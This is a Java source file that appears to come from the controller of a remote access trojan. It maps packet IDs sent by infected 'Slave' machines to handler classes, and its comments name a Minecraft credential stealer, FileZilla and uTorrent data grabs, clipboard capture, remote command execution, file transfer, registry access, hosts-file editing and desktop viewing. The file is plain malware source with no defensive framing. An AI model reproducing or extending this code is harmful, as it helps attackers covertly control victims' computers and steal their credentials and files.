package com.redpois0n.packets;

import java.util.HashMap;
import java.util.Set;

import com.redpois0n.Slave;

public class Packets {

	//private static final HashMap<String, Class<? extends AbstractPacket>> incomingPackets = new HashMap<String, Class<? extends AbstractPacket>>();
	private static final HashMap<Short, Class<? extends AbstractPacket>> incomingPackets = new HashMap<Short, Class<? extends AbstractPacket>>();

	public static HashMap<Short, Class<? extends AbstractPacket>> getIncomingPackets() {
		return incomingPackets;
	}

	static {
		reload();
	}

	private static void reload() {
		incomingPackets.clear();
		incomingPackets.put(/* "LOCALE" */(short) 10, PacketLOCALE.class);
		incomingPackets.put(/* "INSTLOCALES" */(short) 11, PacketINSTLOCALES.class);
		incomingPackets.put(/* "DISCONNECT" */(short) 12, PacketDISCONNECT.class); // disconnect
		incomingPackets.put(/* "STAT" */(short) 13, PacketSTAT.class); // status
		incomingPackets.put(/* "COMPUTERNAME" */(short) 14, PacketCOMPUTERNAME.class); // computername
		incomingPackets.put(/* "SERVERID" */(short) 15, PacketSERVERID.class); // server
																				// id
		incomingPackets.put(/* "OSNAME" */(short) 16, PacketOSNAME.class); // os
																			// name
		incomingPackets.put(/* "IMAGECOMING" */(short) 17, PacketIMAGECOMING.class); // image
		incomingPackets.put(/* "SINGLEIMAGECOMING" */(short) 18, PacketSINGLEIMAGECOMING.class); // single
																									// image
		incomingPackets.put(/* "FOLDERLIST" */(short) 19, PacketFOLDERLIST.class); // list
																					// of
																					// folders
																					// in
																					// dir
		incomingPackets.put(/* "PROCESS" */(short) 20, PacketPROCESS.class); // process
		incomingPackets.put(/* "CMD" */(short) 21, PacketCMD.class); // command
																		// prompt
																		// line
		incomingPackets.put(/* "USERNAME" */(short) 22, PacketUSERNAME.class); // username
		incomingPackets.put(/* "SERVERPATH" */(short) 23, PacketSERVERPATH.class); // server
																					// path
		incomingPackets.put(/* "HERERAM" */(short) 24, PacketHERERAM.class); // ram
		incomingPackets.put(/* "JAVAVER" */(short) 25, PacketJAVAVER.class); // java
																				// version
		incomingPackets.put(/* "JAVAPATH" */(short) 26, PacketJAVAPATH.class); // javapath
		incomingPackets.put(/* "URLSTAT" */(short) 27, PacketURLSTAT.class); // adv
																				// downloader
																				// info
		incomingPackets.put(/* "LOCALIP" */(short) 28, PacketLOCALIP.class); // local
																				// ip
		incomingPackets.put(/* "FILE" */(short) 29, PacketFILE.class); // file
																		// transfer
		incomingPackets.put(/* "VERSION" */(short) 30, PacketVERSION.class); // version
		incomingPackets.put(/* "DATE" */(short) 31, PacketDATE.class); // date
																		// of
																		// install
		incomingPackets.put(/* "VARPROP" */(short) 32, PacketVARPROP.class); // system
																				// env
																				// /
																				// prop
		incomingPackets.put(/* "THUMBNAIL" */(short) 33, PacketTHUMBNAIL.class); // tumbnail
		incomingPackets.put(/* "DIR" */(short) 34, PacketDIR.class); // get dir
		incomingPackets.put(/* "CHAT" */(short) 35, PacketCHAT.class); // chat
		incomingPackets.put(/* "MC" */(short) 36, PacketMC.class); // minecraft
																	// stealer
		incomingPackets.put(/* "FF" */(short) 37, PacketFF.class); // file
																	// finder
		incomingPackets.put(/* "HOSTF" */(short) 38, PacketHOSTF.class); // host
																			// file
																			// text
		incomingPackets.put(/* "HOSTANSW" */(short) 39, PacketHOSTANSW.class); // host
																				// file
																				// answer
		incomingPackets.put(/* "UTOR" */(short) 40, PacketUTOR.class); // utorrent
																		// logs
		incomingPackets.put(/* "CBOARDC" */(short) 41, PacketCBOARDC.class); // clipboard
																				// contents
		incomingPackets.put(/* "FC" */(short) 42, PacketFC.class); // file
																	// preview
		incomingPackets.put(/* "IC" */(short) 43, PacketIC.class); // image
																	// preview
		incomingPackets.put(/* "JVM" */(short) 44, PacketJVM.class); // JVM info
		incomingPackets.put(/* "ZIP" */(short) 45, PacketZIP.class); // zip
																		// preview
		incomingPackets.put(/* "MD5" */(short) 46, PacketMD5.class); // file md5
		incomingPackets.put(/* "COUNTRY" */(short) 47, PacketCOUNTRY.class); // user.country
																				// backup
		incomingPackets.put(/* "FZ" */(short) 48, PacketFZ.class); // filezilla
		incomingPackets.put(/* "LAN" */(short) 49, PacketLAN.class); // lan view
		incomingPackets.put(/* "IPC" */(short) 50, PacketIPC.class); // ipconfig
		incomingPackets.put(/* "APORT" */(short) 51, PacketAPORT.class); // active
																			// port
		incomingPackets.put(/* "WINSER" */(short) 52, PacketWINSER.class); // windows
																			// service
																			// listing
		incomingPackets.put(/* "REGSTART" */(short) 53, PacketREGSTART.class); // registry
																				// startup
																				// listing
		incomingPackets.put(/* "REG" */(short) 54, PacketREG.class); // registry
																		// enter
		incomingPackets.put(/* "INSTPROG" */(short) 55, PacketINSTPROG.class); // installed
																				// program
																				// list
		incomingPackets.put(/* "ADAPT" */(short) 56, PacketADAPT.class); // network
																			// adapters
																			// list
		incomingPackets.put(/* "RAWINFO" */(short) 57, PacketRAWINFO.class); // raw
																				// info
																				// listing
		incomingPackets.put(/* "SO" */(short) 58, PacketSO.class); // sound
		incomingPackets.put(/* "IMGLIST" */(short) 59, PacketIMGLIST.class); // thumbnail
																				// preview
		incomingPackets.put(/* "ERROR" */(short) 60, PacketERROR.class); // error
		incomingPackets.put(/* "MONITOR" */(short) 61, PacketMONITOR.class); // monitors
																				// listing
		incomingPackets.put(/* "DRIVES" */(short) 62, PacketDRIVES.class); // drives
																			// listing
		incomingPackets.put(/* "RAM" */(short) 63, PacketRAM.class); // ram
		incomingPackets.put(/* "APS" */(short) 64, PacketAPS.class); // available
																		// processors
		incomingPackets.put(/* "ERRLOG" */(short) 65, PacketERRLOG.class); // error
																			// log
																			// file
		incomingPackets.put(/* "CONFIG" */(short) 66, PacketCONFIG.class); // config
																			// list
		incomingPackets.put(/* "PLUGIN" */(short) 67, PacketPLUGIN.class); // plugin
																			// list
		incomingPackets.put(/* "QUICKDESKTOP" */(short) 68, PacketQUICKDESKTOP.class); // quick
																						// desktop
	}

	public static boolean execute(short line, Slave slave) {
		try {
			AbstractPacket ac = null;
			Set<Short> set = incomingPackets.keySet();
			for (Short str : set) {
				if (str.equals(line)) {
					ac = incomingPackets.get(str).newInstance();
					break;
				}
			}
			if (ac != null) {
				/*if (line.equals("REGSTART")) {
					new PacketREGSTART().read(slave, line);
				} else if (line.equals("SO")) {
					PacketSO.handle(slave);
				} else {*/
					ac.read(slave, line + "");
				//}
			}

			// TODO PluginEventHandler.onPacket(slave, line); 
			String s;

			return ac != null;
		} catch (Exception ex) {
			Exception ex1 = new Exception("Failed to handle packet: " + line, ex);
			ex1.printStackTrace();
			return false;
		}
	}

}